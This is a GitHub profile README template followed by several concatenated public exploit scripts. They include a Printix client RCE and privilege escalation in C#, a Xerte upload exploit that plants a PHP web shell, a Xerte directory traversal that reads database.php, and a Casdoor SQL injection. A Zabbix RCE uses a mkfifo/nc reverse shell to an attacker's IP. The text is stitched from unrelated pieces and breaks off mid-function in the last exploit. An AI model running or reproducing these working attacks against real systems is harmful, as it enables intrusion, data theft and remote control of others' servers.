- 👋 Hi, I’m @d3ltacros
- 👀 I’m interested in ...
- 🌱 I’m currently learning ...
- 💞️ I’m looking to collaborate on ...
- 📫 How to reach me ...

<!---
d3ltacros/d3ltacros is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
You can click the Preview link to take a look at your changes.
--->
git clone https://github.com/d3ltacros/d3ltacros
# Exploit Title: Printix Client 1.3.1106.0 - Remote Code Execution (RCE)
# Date: 3/1/2022
# Exploit Author: Logan Latvala
# Vendor Homepage: https://printix.net
# Software Link: https://software.printix.net/client/win/1.3.1106.0/PrintixClientWindows.zip
# Version: <= 1.3.1106.0
# Tested on: Windows 7, Windows 8, Windows 10, Windows 11
# CVE : CVE-2022-25089
# Github for project: https://github.com/ComparedArray/printix-CVE-2022-25089

using Microsoft.Win32;
using Newtonsoft.Json;
using Newtonsoft.Json.Converters;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

/**
 * ________________________________________
 *
 * Printix Vulnerability, CVE-2022-25089
 * Part of a Printix Vulnerability series
 * Author: Logan Latvala
 * Github: https://github.com/ComparedArray/printix-CVE-2022-25089
 * ________________________________________
 *
 */


namespace ConsoleApp1a
{

    public class PersistentRegistryData
    {
        public PersistentRegistryCmds cmd;

        public string path;

        public int VDIType;

        public byte[] registryData;
    }

    [JsonConverter(typeof(StringEnumConverter))]
    public enum PersistentRegistryCmds
    {
        StoreData = 1,
        DeleteSubTree,
        RestoreData
    }
    public class Session
    {
        public int commandNumber { get; set; }
        public string host { get; set; }
        public string data { get; set; }
        public string sessionName { get; set; }
        public Session(int commandSessionNumber = 0)
        {
            commandNumber = commandSessionNumber;
            switch (commandSessionNumber)
            {
                //Incase it's initiated, kill it immediately.
                case (0):
                    Environment.Exit(0x001);
                    break;

                //Incase the Ping request is sent though, get its needed data.
                case (2):
                    Console.WriteLine("\n What Host Address?  (DNS Names Or IP)\n");
                    Console.Write("IP: ");
                    host = Console.ReadLine();
                    Console.WriteLine("Host address set to: " + host);

                    data = "pingData";
                    sessionName = "PingerRinger";
                    break;

                //Incase the RegEdit request is sent though, get its needed data.
                case (49):
                    Console.WriteLine("\n What Host Address?  (DNS Names Or IP)\n");
                    Console.Write("IP: ");
                    host = Console.ReadLine();
                    Console.WriteLine("Host address set to: " + host);

                    PersistentRegistryData persistentRegistryData = new PersistentRegistryData();
                    persistentRegistryData.cmd = PersistentRegistryCmds.RestoreData;
                    persistentRegistryData.VDIType = 12; //(int)DefaultValues.VDIType;
                                                         //persistentRegistryData.path = "printix\\SOFTWARE\\Intel\\HeciServer\\das\\SocketServiceName";
                    Console.WriteLine("\n What Node starting from \\\\Local-Machine\\ would you like to select? \n");
                    Console.WriteLine("Example: HKEY_LOCAL_MACHINE\\SOFTWARE\\Intel\\HeciServer\\das\\SocketServiceName\n");
                    Console.WriteLine("You can only change values in HKEY_LOCAL_MACHINE");
                    Console.Write("Registry Node: ");
                    persistentRegistryData.path = "" + Console.ReadLine().Replace("HKEY_LOCAL_MACHINE","printix");
                    Console.WriteLine("Full Address Set To:  " + persistentRegistryData.path);

                    //persistentRegistryData.registryData = new byte[2];
                    //byte[] loader = selectDataType("Intel(R) Capability Licensing stuffidkreally", RegistryValueKind.String);

                    Console.WriteLine("\n What Data type are you using? \n1. String 2. Dword  3. Qword 4. Multi String  \n");
                    Console.Write("Type:  ");
                    int dataF = int.Parse(Console.ReadLine());
                    Console.WriteLine("Set Data to: " + dataF);

                    Console.WriteLine("\n What value is your type?  \n");
                    Console.Write("Value:  ");
                    string dataB = Console.ReadLine();
                    Console.WriteLine("Set Data to: " + dataF);

                    byte[] loader = null;
                    List<byte> byteContainer = new List<byte>();
                    //Dword = 4
                    //SET THIS NUMBER TO THE TYPE OF DATA YOU ARE USING! (CHECK ABOVE FUNCITON selectDataType()!)

                    switch (dataF)
                    {
                        case (1):

                            loader = selectDataType(dataB, RegistryValueKind.String);
                            byteContainer.Add(1);
                            break;
                        case (2):
                            loader = selectDataType(int.Parse(dataB), RegistryValueKind.DWord);
                            byteContainer.Add(4);
                            break;
                        case (3):
                            loader = selectDataType(long.Parse(dataB), RegistryValueKind.QWord);
                            byteContainer.Add(11);
                            break;
                        case (4):
                            loader = selectDataType(dataB.Split('%'), RegistryValueKind.MultiString);
                            byteContainer.Add(7);
                            break;

                    }

                    int pathHolder = 0;
                    foreach (byte bit in loader)
                    {
                        pathHolder++;
                        byteContainer.Add(bit);
                    }

                    persistentRegistryData.registryData = byteContainer.ToArray();
                    //added stuff:

                    //PersistentRegistryData data = new PersistentRegistryData();
                    //data.cmd = PersistentRegistryCmds.RestoreData;
                    //data.path = "";


                    //data.cmd
                    Console.WriteLine(JsonConvert.SerializeObject(persistentRegistryData));
                    data = JsonConvert.SerializeObject(persistentRegistryData);

                    break;
                //Custom cases, such as custom JSON Inputs and more.
                case (100):
                    Console.WriteLine("\n What Host Address?  (DNS Names Or IP)\n");
                    Console.Write("IP: ");
                    host = Console.ReadLine();
                    Console.WriteLine("Host address set to: " + host);

                    Console.WriteLine("\n What Data Should Be Sent?\n");
                    Console.Write("Data: ");
                    data = Console.ReadLine();
                    Console.WriteLine("Data set to: " + data);

                    Console.WriteLine("\n What Session Name Should Be Used? \n");
                    Console.Write("Session Name: ");
                    sessionName = Console.ReadLine();
                    Console.WriteLine("Session name set to: " + sessionName);
                    break;
            }


        }
        public static byte[] selectDataType(object value, RegistryValueKind format)
        {
            byte[] array = new byte[50];

            switch (format)
            {
                case RegistryValueKind.String: //1
                    array = Encoding.UTF8.GetBytes((string)value);
                    break;
                case RegistryValueKind.DWord://4
                    array = ((!(value.GetType() == typeof(int))) ? BitConverter.GetBytes((long)value) : BitConverter.GetBytes((int)value));
                    break;
                case RegistryValueKind.QWord://11
                    if (value == null)
                    {
                        value = 0L;
                    }
                    array = BitConverter.GetBytes((long)value);
                    break;
                case RegistryValueKind.MultiString://7
                    {
                        if (value == null)
                        {
                            value = new string[1] { string.Empty };
                        }
                        string[] array2 = (string[])value;
                        foreach (string s in array2)
                        {
                            byte[] bytes = Encoding.UTF8.GetBytes(s);
                            byte[] second = new byte[1] { (byte)bytes.Length };
                            array = array.Concat(second).Concat(bytes).ToArray();
                        }
                        break;
                    }
            }
            return array;
        }
    }
    class CVESUBMISSION
    {
        static void Main(string[] args)
        {
        FORCERESTART:
            try
            {

                //Edit any registry without auth:
                //Use command 49, use the code provided on the desktop...
                //This modifies it directly, so no specific username is needed. :D

                //The command parameter, a list of commands is below.
                int command = 43;

                //To force the user to input variables or not.
                bool forceCustomInput = false;

                //The data to send, this isn't flexible and should be used only for specific examples.
                //Try to keep above 4 characters if you're just shoving things into the command.
                string data = "{\"profileID\":1,\"result\":true}";

                //The username to use.
                //This is to fulfill the requriements whilst in development mode.
                DefaultValues.CurrentSessName = "printixMDNs7914";

                //The host to connect to. DEFAULT= "localhost"
                string host = "192.168.1.29";

            //                                Configuration Above

            InvalidInputLabel:
                Console.Clear();
                Console.WriteLine("Please select the certificate you want to use with port 21338.");
                //Deprecated, certificates are no longer needed to verify, as clientside only uses the self-signed certificates now.
                Console.WriteLine("Already selected, client authentication isn't needed.");

                Console.WriteLine(" /───────────────────────────\\ ");
                Console.WriteLine("\nWhat would you like to do?");
                Console.WriteLine("\n    1. Send Ping Request");
                Console.WriteLine("    2. Send Registry Edit Request");
                Console.WriteLine("    3. Send Custom Request");
                Console.WriteLine("    4. Experimental Mode (Beta)\n");
                Console.Write("I choose option # ");

                try
                {
                    switch (int.Parse(Console.ReadLine().ToLower()))
                    {
                        case (1):
                            Session session = new Session(2);

                            command = session.commandNumber;
                            host = session.host;
                            data = session.data;
                            DefaultValues.CurrentSessName = "printixReflectorPackage_" + new Random().Next(1, 200);



                            break;
                        case (2):
                            Session sessionTwo = new Session(49);

                            command = sessionTwo.commandNumber;
                            host = sessionTwo.host;
                            data = sessionTwo.data;
                            DefaultValues.CurrentSessName = "printixReflectorPackage_" + new Random().Next(1, 200);

                            break;
                        case (3):

                            Console.WriteLine("What command number do you want to input?");
                            command = int.Parse(Console.ReadLine().ToString());
                            Console.WriteLine("What IP would you like to use? (Default = localhost)");
                            host = Console.ReadLine();
                            Console.WriteLine("What data do you want to send? (Keep over 4 chars if you are not sure!)");
                            data = Console.ReadLine();

                            Console.WriteLine("What session name do you want to use? ");
                            DefaultValues.CurrentSessName = Console.ReadLine();
                            break;
                        case (4):
                            Console.WriteLine("Not yet implemented.");
                            break;
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine("Invalid Input!");
                    goto InvalidInputLabel;
                }
                
                Console.WriteLine("Proof Of Concept For CVE-2022-25089 | Version: 1.3.24 | Created by Logan Latvala");
                Console.WriteLine("This is a RAW API, in which you may get unintended results from usage.\n");

                CompCommClient client = new CompCommClient();


                byte[] responseStorage = new byte[25555];
                int responseCMD = 0;
                client.Connect(host, 21338, 3, 10000);

                client.SendMessage(command, Encoding.UTF8.GetBytes(data));
                // Theory: There is always a message being sent, yet it doesn't read it, or can't intercept it.
                // Check for output multiple times, and see if this is conclusive.



                //client.SendMessage(51, Encoding.ASCII.GetBytes(data));
                new Thread(() => {
                    //Thread.Sleep(4000);
                    if (client.Connected())
                    {
                        int cam = 0;
                        // 4 itterations of loops, may be lifted in the future.
                        while (cam < 5)
                        {

                            //Reads the datastream and keeps returning results.
                            //Thread.Sleep(100);
                            try
                            {
                                try
                                {
                                    if (responseStorage?.Any() == true)
                                    {
                                        //List<byte> byo1 =  responseStorage.ToList();
                                        if (!Encoding.UTF8.GetString(responseStorage).Contains("Caption"))
                                        {
                                            foreach (char cam2 in Encoding.UTF8.GetString(responseStorage))
                                            {
                                                if (!char.IsWhiteSpace(cam2) && char.IsLetterOrDigit(cam2) || char.IsPunctuation(cam2))
                                                {
                                                    Console.Write(cam2);
                                                }
                                            }
                                        }else
                                        {
                                            
                                        }
                                    }

                                }
                                catch (Exception e) { Debug.WriteLine(e); }
                                client.Read(out responseCMD, out responseStorage);

                            }
                            catch (Exception e)
                            {
                                goto ReadException;
                            }
                            Thread.Sleep(100);
                            cam++;
                            //Console.WriteLine(cam);
                        }

                    


                    }
                    else
                    {
                        Console.WriteLine("[WARNING]: Client is Disconnected!");
                    }
                ReadException:
                    try
                    {
                        Console.WriteLine("Command Variable Response: " + responseCMD);
                        Console.WriteLine(Encoding.UTF8.GetString(responseStorage) + " || " + responseCMD);
                        client.disConnect();
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine("After 4.2 Seconds, there has been no response!");
                        client.disConnect();
                    }
                }).Start();

                Console.WriteLine(responseCMD);
                Console.ReadLine();

            }

            catch (Exception e)
            {
                Console.WriteLine(e);
                Console.ReadLine();

                //Environment.Exit(e.HResult);
            }

            goto FORCERESTART;
        }
    }
}
# Exploit Title: Xerte 3.9 - Remote Code Execution (RCE) (Authenticated)
# Date: 05/03/2021
# Exploit Author: Rik Lutz
# Vendor Homepage: https://xerte.org.uk
# Software Link: https://github.com/thexerteproject/xerteonlinetoolkits/archive/refs/heads/3.8.5-33.zip
# Version: up until version 3.9
# Tested on: Windows 10 XAMP
# CVE : CVE-2021-44664

# This PoC assumes guest login is enabled and the en-GB langues files are used.
# This PoC wil overwrite the existing langues file (.inc) for the englisch index page with a shell.
# Vulnerable url: https://<host>/website_code/php/import/fileupload.php
# The mediapath variable can be used to set the destination of the uploaded.
# Create new project from template -> visit "Properties" (! symbol) -> Media and Quota

import requests
import re

xerte_base_url = "http://127.0.0.1"
php_session_id = "" # If guest is not enabled, and you have a session ID. Put it here.

with requests.Session() as session:
    # Get a PHP session ID
    if not php_session_id:
        session.get(xerte_base_url)
    else:
        session.cookies.set("PHPSESSID", php_session_id)

     # Use a default template
    data = {
        'tutorialid': 'Nottingham',
        'templatename': 'Nottingham',
        'tutorialname': 'exploit',
        'folder_id': ''
    }

    # Create a new project in order to find the install path
    template_id = session.post(xerte_base_url + '/website_code/php/templates/new_template.php', data=data)

    # Find template ID
    data = {
        'template_id': re.findall('(\d+)', template_id.text)[0]
    }

    # Find the install path:
    install_path = session.post(xerte_base_url + '/website_code/php/properties/media_and_quota_template.php', data=data)
    install_path = re.findall('mediapath" value="(.+?)"', install_path.text)[0]

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'nl,en-US;q=0.7,en;q=0.3',
        'Content-Type': 'multipart/form-data; boundary=---------------------------170331411929658976061651588978',
       }

    # index.inc file
    data = \
    '''-----------------------------170331411929658976061651588978
Content-Disposition: form-data; name="filenameuploaded"; filename="index.inc"
Content-Type: application/octet-stream

<?php
if(isset($_REQUEST[\'cmd\'])){ echo "<pre>"; $cmd = ($_REQUEST[\'cmd\']); system($cmd); echo "</pre>"; die; }
/**
 *
 * index.php english language file
 *
 * @author Patrick Lockley
 * @version 1.0
 * @copyright Pat Lockley
 * @package
 */

define("INDEX_USERNAME_AND_PASSWORD_EMPTY", "Please enter your username and password");

define("INDEX_USERNAME_EMPTY", "Please enter your username");

define("INDEX_PASSWORD_EMPTY", "Please enter your password");

define("INDEX_LDAP_MISSING", "PHP\'s LDAP library needs to be installed to use LDAP authentication. If you read the install guide other options are available");

define("INDEX_SITE_ADMIN", "Site admins should log on on the manangement page");

define("INDEX_LOGON_FAIL", "Sorry that password combination was not correct");

define("INDEX_LOGIN", "login area");

define("INDEX_USERNAME", "Username");

define("INDEX_PASSWORD", "Password");

define("INDEX_HELP_TITLE", "Getting Started");

define("INDEX_HELP_INTRODUCTION", "We\'ve produced a short introduction to the Toolkits website.");

define("INDEX_HELP_INTRO_LINK_TEXT","Show me!");

define("INDEX_NO_LDAP","PHP\'s LDAP library needs to be installed to use LDAP authentication. If you read the install guide other options are available");

define("INDEX_FOLDER_PROMPT","What would you like to call your folder?");

define("INDEX_WORKSPACE_TITLE","My Projects");

define("INDEX_CREATE","Project Templates");

define("INDEX_DETAILS","Project Details");

define("INDEX_SORT","Sort");

define("INDEX_SEARCH","Search");

define("INDEX_SORT_A","Alphabetical A-Z");

define("INDEX_SORT_Z","Alphabetical Z-A");

define("INDEX_SORT_NEW","Age (New to Old)");

define("INDEX_SORT_OLD","Age (Old to New)");

define("INDEX_LOG_OUT","Log out");

define("INDEX_LOGGED_IN_AS","Logged in as");

define("INDEX_BUTTON_LOGIN","Login");

define("INDEX_BUTTON_LOGOUT","Logout");

define("INDEX_BUTTON_PROPERTIES","Properties");

define("INDEX_BUTTON_EDIT","Edit");

define("INDEX_BUTTON_PREVIEW", "Preview");

define("INDEX_BUTTON_SORT", "Sort");

define("INDEX_BUTTON_NEWFOLDER", "New Folder");

define("INDEX_BUTTON_NEWFOLDER_CREATE", "Create");

define("INDEX_BUTTON_DELETE", "Delete");

define("INDEX_BUTTON_DUPLICATE", "Duplicate");

define("INDEX_BUTTON_PUBLISH", "Publish");

define("INDEX_BUTTON_CANCEL", "Cancel");

define("INDEX_BUTTON_SAVE", "Save");

define("INDEX_XAPI_DASHBOARD_FROM", "From:");

define("INDEX_XAPI_DASHBOARD_UNTIL", "Until:");

define("INDEX_XAPI_DASHBOARD_GROUP_SELECT", "Select group:");

define("INDEX_XAPI_DASHBOARD_GROUP_ALL", "All groups");

define("INDEX_XAPI_DASHBOARD_SHOW_NAMES", "Show names and/or email addresses");

define("INDEX_XAPI_DASHBOARD_CLOSE", "Close dashboard");

define("INDEX_XAPI_DASHBOARD_DISPLAY_OPTIONS", "Display options");

define("INDEX_XAPI_DASHBOARD_SHOW_HIDE_COLUMNS", "Show / hide columns");

define("INDEX_XAPI_DASHBOARD_QUESTION_OVERVIEW", "Interaction overview");

define("INDEX_XAPI_DASHBOARD_PRINT", "Print");
\r
\r
-----------------------------170331411929658976061651588978
Content-Disposition: form-data; name="mediapath"

''' \
    + install_path \
    + '''../../../languages/en-GB/
-----------------------------170331411929658976061651588978--\r
'''

    # Overwrite index.inc file
    response = session.post(xerte_base_url + '/website_code/php/import/fileupload.php', headers=headers, data=data)
    print('Installation path: ' + install_path)
    print(response.text)
    if "success" in response.text:
        print("Visit shell @: " + xerte_base_url + '/?cmd=whoami')
# Exploit Title: Xerte 3.10.3 - Directory Traversal (Authenticated)
# Date: 05/03/2021
# Exploit Author: Rik Lutz
# Vendor Homepage: https://xerte.org.uk
# Software Link: https://github.com/thexerteproject/xerteonlinetoolkits/archive/refs/heads/3.9.zip
# Version: up until 3.10.3
# Tested on: Windows 10 XAMP
# CVE : CVE-2021-44665

# This PoC assumes guest login is enabled. Vulnerable url:
# https://<host>/getfile.php?file=<user-direcotry>/../../database.php
# You can find a userfiles-directory by creating a project and browsing the media menu.
# Create new project from template -> visit "Properties" (! symbol) -> Media and Quota -> Click file to download
# The userfiles-direcotry will be noted in the URL and/or when you download a file.
# They look like: <numbers>-<username>-<templatename>

import requests
import re

xerte_base_url = "http://127.0.0.1"
file_to_grab = "/../../database.php"
php_session_id = "" # If guest is not enabled, and you have a session ID. Put it here.

with requests.Session() as session:
    # Get a PHP session ID
    if not php_session_id:
        session.get(xerte_base_url)
    else:
        session.cookies.set("PHPSESSID", php_session_id)

    # Use a default template
    data = {
        'tutorialid': 'Nottingham',
        'templatename': 'Nottingham',
        'tutorialname': 'exploit',
        'folder_id': ''
    }

    # Create a new project in order to create a user-folder
    template_id = session.post(xerte_base_url + '/website_code/php/templates/new_template.php', data=data)

    # Find template ID
    data = {
        'template_id': re.findall('(\d+)', template_id.text)[0]
    }

    # Find the created user-direcotry:
    user_direcotry = session.post(xerte_base_url + '/website_code/php/properties/media_and_quota_template.php', data=data)
    user_direcotry = re.findall('USER-FILES\/([0-9]+-[a-z0-9]+-[a-zA-Z0-9_]+)', user_direcotry.text)[0]

    # Grab file
    result = session.get(xerte_base_url + '/getfile.php?file=' + user_direcotry + file_to_grab)
    print(result.text)
    print("|-- Used Variables: --|")
    print("PHP Session ID: " + session.cookies.get_dict()['PHPSESSID'])
    print("user direcotry: " + user_direcotry)
    print("Curl example:")
    print('curl --cookie "PHPSESSID=' + session.cookies.get_dict()['PHPSESSID'] + '" ' + xerte_base_url + '/getfile.php?file=' + user_direcotry + file_to_grab)
// Exploit Title: Casdoor 1.13.0 - SQL Injection (Unauthenticated)
// Date: 2022-02-25
// Exploit Author: Mayank Deshmukh
// Vendor Homepage: https://casdoor.org/
// Software Link: https://github.com/casdoor/casdoor/releases/tag/v1.13.0
// Version: version < 1.13.1
// Security Advisory: https://github.com/advisories/GHSA-m358-g4rp-533r
// Tested on: Kali Linux
// CVE : CVE-2022-24124
// Github POC: https://github.com/ColdFusionX/CVE-2022-24124

// Exploit Usage : go run exploit.go -u http://127.0.0.1:8080

package main

import (
    "flag"
    "fmt"
    "html"
    "io/ioutil"
    "net/http"
    "os"
    "regexp"
    "strings"
)

func main() {
    var url string
    flag.StringVar(&url, "u", "", "Casdoor URL (ex. http://127.0.0.1:8080)")
    flag.Parse()

    banner := `
-=Casdoor SQL Injection (CVE-2022-24124)=-
- by Mayank Deshmukh (ColdFusionX)

`
    fmt.Printf(banner)
    fmt.Println("[*] Dumping Database Version")
    response, err := http.Get(url + "/api/get-organizations?p=123&pageSize=123&value=cfx&sortField=&sortOrder=&field=updatexml(null,version(),null)")

    if err != nil {
        panic(err)
    }

    defer response.Body.Close()

    databytes, err := ioutil.ReadAll(response.Body)

    if err != nil {
        panic(err)
    }

    content := string(databytes)

    re := regexp.MustCompile("(?i)(XPATH syntax error.*&#39)")

    result := re.FindAllString(content, -1)
    
    sqliop := fmt.Sprint(result)
    replacer := strings.NewReplacer("[", "", "]", "", "&#39", "", ";", "")
    
    finalop := replacer.Replace(sqliop)
    fmt.Println(html.UnescapeString(finalop))


    if result == nil {
        fmt.Printf("Application not vulnerable\n")
        os.Exit(1)
    }

}
# Exploit Title: Zabbix 5.0.17 - Remote Code Execution (RCE) (Authenticated)
# Date: 9/3/2022
# Exploit Author: Hussien Misbah
# Vendor Homepage: https://www.zabbix.com/
# Software Link: https://www.zabbix.com/rn/rn5.0.17
# Version: 5.0.17
# Tested on: Linux
# Reference: https://github.com/HussienMisbah/tools/tree/master/Zabbix_exploit

#!/usr/bin/python3
# note : this is blind RCE so don't expect to see results on the site
# this exploit is tested against Zabbix 5.0.17 only

import sys
import requests
import re
import random
import string
import colorama
from colorama import Fore


print(Fore.YELLOW+"[*] this exploit is tested against Zabbix 5.0.17 only")
print(Fore.YELLOW+"[*] can reach the author @ https://hussienmisbah.github.io/")


def item_name() :
    letters = string.ascii_letters
    item =  ''.join(random.choice(letters) for i in range(20))
    return item

if len(sys.argv) != 6 :
    print(Fore.RED +"[!] usage : ./expoit.py <target url>  <username> <password> <attacker ip> <attacker port>")
    sys.exit(-1)

url  = sys.argv[1]
username =sys.argv[2]
password = sys.argv[3]
host = sys.argv[4]
port = sys.argv[5]


s = requests.Session()


headers ={
"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
}

data = { 
"request":"hosts.php",
"name"  : username ,
"password" : password ,
"autologin" :"1" ,
"enter":"Sign+in"
}


proxies = {
   'http': 'http://127.0.0.1:8080'
}


r = s.post(url+"/index.php",data=data)  #proxies=proxies)

if "Sign out" not in r.text :
    print(Fore.RED +"[!] Authentication failed")
    sys.exit(-1)
if "Zabbix 5.0.17" not in r.text :
    print(Fore.RED +"[!] This is not Zabbix 5.0.17")
    sys.exit(-1)

if "filter_hostids%5B0%5D=" in r.text :
    try :
        x = re.search('filter_hostids%5B0%5D=(.*?)"', r.text)
        hostId = x.group(1)
    except :
        print(Fore.RED +"[!] Exploit failed to resolve HostID")
        print(Fore.BLUE +"[?] you can find it under /items then add item")
        sys.exit(-1)
else :
    print(Fore.RED +"[!] Exploit failed to resolve HostID")
    print(Fore.BLUE +"[?] you can find HostID under /items then add item")
    sys.exit(-1)


sid= re.search('<meta name="csrf-token" content="(.*)"/>',r.text).group(1) # hidden_csrf_token


command=f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {host} {port}  >/tmp/f"

payload = f"system.run[{command},nowait]"
Random_name = item_name()
data2 ={
    
"sid":sid,"form_refresh":"1","form":"create","hostid":hostId,"selectedInterfaceId":"0","name":Random_name,"type":"0","key":payload,"url":"","query_fields[name][1]":"","query_fields[value][1]":"","timeout":"3s","post_type":"0","posts":"","headers[name][1]":"","headers[value][1]":"","status_codes":"200","follow_redirects":"1","retrieve_mode":"0","http_proxy":"","http_username":"","http_password":"","ssl_cert_file":"","ssl_key_file":"","ssl_key_password":"","interfaceid":"1","params_es":"","params_ap":"","params_f":"","value_type":"3","units":"","delay":"1m","delay_flex[0][type]":"0","delay_flex[0][delay]":"","delay_flex[0][schedule]":"","delay_flex[0][period]":"","history_mode":"1","history":"90d","trends_mode":"1","trends":"365d","valuemapid":"0","new_application":"","applications[]":"0","inventory_link":"0","description":"","status":"0","add":"Add"
}

r2 =s.post(url+"/items.php" ,data=data2,headers=headers,cookies={"tab":"0"} )


no_pages= r2.text.count("?page=")

#################################################[Searching in all pages for the uploaded item]#################################################
page = 1
flag=False
while page <= no_pages :
    r_page=s.get(url+f"/items.php?page={page}" ,headers=headers )
    if  Random_name in r_page.text :
        print(Fore.GREEN+"[+] the payload has been Uploaded Successfully")
        x2 = re.search(rf"(\d+)[^\d]>{Random_name}",r_page.text)
        try :
            itemId=x2.group(1)
        except :
            pass

        print(Fore.GREEN+f"[+] you should find it at {url}/items.php?form=update&hostid={hostId}&itemid={itemId}")
        flag=True
        break

    else :
        page +=1

if flag==False :
        print(Fore.BLUE +"[?] do you know you can't upload same key twice ?")
        print(Fore.BLUE +"[?] maybe it is already uploaded so set the listener and wait 1m")
        print(Fore.BLUE +"[*] change the port and try again")
        sys.exit(-1)

#################################################[Executing the item]#################################################


data2["form"] ="update"
data2["selectedInterfaceId"] = "1"
data2["check_now"]="Execute+now"
data2.pop("add",None)
data2["itemid"]=itemId,

print(Fore.GREEN+f"[+] set the listener at {port} please...")

r2 =s.post(url+"/items.php" ,data=data2,headers=headers,cookies={"tab":"0"}) # ,proxies=proxies )

print(Fore.BLUE+ "[?] note : it takes up to +1 min so be patient :)")
answer =input(Fore.BLUE+"[+] got a shell ? [y]es/[N]o: ")

if "y" in answer.lower() :
    print(Fore.GREEN+"Nice !")
else :
    print(Fore.RED+"[!] if you find out why please contact me ")

sys.exit(0)# Exploit Title: Printix Client 1.3.1106.0 - Privilege Escalation
# Date: 3/2/2022
# Exploit Author: Logan Latvala
# Vendor Homepage: https://printix.net
# Software Link:
https://software.printix.net/client/win/1.3.1106.0/PrintixClientWindows.zip
# Version: <= 1.3.1106.0
# Tested on: Windows 7, Windows 8, Windows 10, Windows 11
# CVE : CVE-2022-25090
# Github for project: https://github.com/ComparedArray/printix-CVE-2022-25090

using System;
using System.Runtime.InteropServices;
using System.Drawing;

using System.Reflection;
using System.Threading;
using System.IO;
using System.Text;
using System.Resources;
using System.Diagnostics;

//Assembly COM for transparent creation of the application.

//End of Assembly COM For Transparent Creation usage.
public class Program
{
    //Initiator class for the program, the program starts on the main method.
    public static void Main(string[] args)
    {
        //Console.SetWindowSize(120,30);
        //Console.SetBufferSize(120,30);
        Console.ForegroundColor = ConsoleColor.Blue;
        Console.WriteLine("┌─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────");
        Console.WriteLine("├              oo dP                           dP                                ");
        Console.ForegroundColor = ConsoleColor.Red;
        Console.WriteLine("├                 88                           88                                ");
        Console.ForegroundColor = ConsoleColor.Green;
        Console.WriteLine("├              dP 88d888b. .d8888b. d888888b d8888P .d8888b. 88d8b.d8b. 88d888b. ");
        Console.ForegroundColor = ConsoleColor.Blue;
        Console.WriteLine("├              88 88'  `88 88'  `88    .d8P'   88   88ooood8 88'`88'`88 88'  `88 ");
        Console.ForegroundColor = ConsoleColor.Yellow;
        Console.WriteLine("├              88 88    88 88.  .88  .Y8P      88   88.  ... 88  88  88 88.  .88 ");
        Console.ForegroundColor = ConsoleColor.Magenta;
        Console.WriteLine("├              dP dP    dP `88888P8 d888888P   dP   `88888P' dP  dP  dP 88Y888P' ");
        Console.WriteLine("├                                                                       88       ");
        Console.WriteLine("├                                                                       dP       ");
        Console.ForegroundColor = ConsoleColor.Blue;
        Console.Write("├                                    For ");
        Console.ForegroundColor = ConsoleColor.Magenta;
        Console.Write("Printix ");
        Console.ForegroundColor = ConsoleColor.Blue;
        Console.Write("Services                       Designed By Logan Latvala\n");
        Console.WriteLine("└─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────");
        Thread.Sleep(3000);
        string filesH = "";
        Console.WriteLine("Drag and drop a payload onto this application for execution.");
        try
        {
            if (args[0]?.Length >0)
            {
                Console.WriteLine("File Added: " + args[0]);
            }
            
        }
        catch (Exception e)
        {
            Console.WriteLine("You\'re missing a file here, please ensure that you drag and drop a payload to execute.\n \n We'll print the error for you right here...\n \n");
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine(e);
            Console.ReadLine();
            Environment.Exit(40);
        }


        Console.WriteLine("\n We're going to look for your printix installer, one moment...");
        string[] installerSearch = Directory.GetFiles(@"C:\windows\installer\", "*.msi", SearchOption.AllDirectories);

        double mCheck = 1.00;

        string trueInstaller = "";
        //Starts to enumerate window's installer directory for an author with the name of printix.
        foreach (string path in installerSearch)
        {
            Console.WriteLine("Searching Files: {0} / {1} Files", mCheck, installerSearch.Length);
            Console.WriteLine("Searching Files... " + (Math.Round((mCheck / installerSearch.Length) * 100)) + "% Done.");
            if (readFileProperties(path, "Printix"))
            {
                trueInstaller = path;
                Console.WriteLine("We've found your installer, we'll finish enumeration.");
                goto MGMA;
            }
            mCheck++;
        }
    //Flag for enumeration when the loop needs to exit, since it shouldn't loop infinitely.
    MGMA:
        if (trueInstaller == "")
        {
            Console.WriteLine("We can't find your installer, you are not vulnerable.");
            Thread.Sleep(2000);
            Environment.Exit(12);
        }
        Console.WriteLine("├─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────");
        Console.WriteLine("├ We are starting to enumerate your temporary directory.");
        Console.WriteLine("├─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────");

        //Start a new thread here for enumeration.

        Thread t = new Thread(() => newTempThread(filesH, args));
        t.Start();



        Process.Start(trueInstaller);



        Console.WriteLine("All done.");
        Console.ReadLine();
    }
    public static void newTempThread(string filesH, string[] args)
    {
        while (true)
        {
            try
            {
                //Starts the inheriting process for printix, in which scans for the files and relays their contents.
                string[] files = Directory.GetFiles(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\", "msiwrapper.ini", SearchOption.AllDirectories);
                if (!string.IsNullOrEmpty(files[0]))
                {
                    foreach (string fl in files)
                    {
                        if (!filesH.Contains(fl))
                        {

                            //filesH += " " + fl;
                            string[] fileText = File.ReadAllLines(fl);
                            int linerc = 0;
                            foreach (string liners in fileText)
                            {

                                if (liners.Contains("SetupFileName"))
                                {

                                    //Most likely the temporary directory for setup, which presents it properly.
                                    Console.WriteLine("├─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────");
                                    Console.WriteLine("├ " + fl);
                                    fileText[linerc] = @"SetupFileName=" + "\"" + args[0] + "\"";
                                    Console.WriteLine("├ " + fileText[linerc] + "");
                                    Console.WriteLine("├─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────");
                                    Console.WriteLine("│");
                                    filesH += " " + fl;

                                    File.WriteAllText(fl, string.Empty);
                                    File.WriteAllLines(fl, fileText);
                                }
                                linerc++;
                            }
                        }
                    }
                }
            }
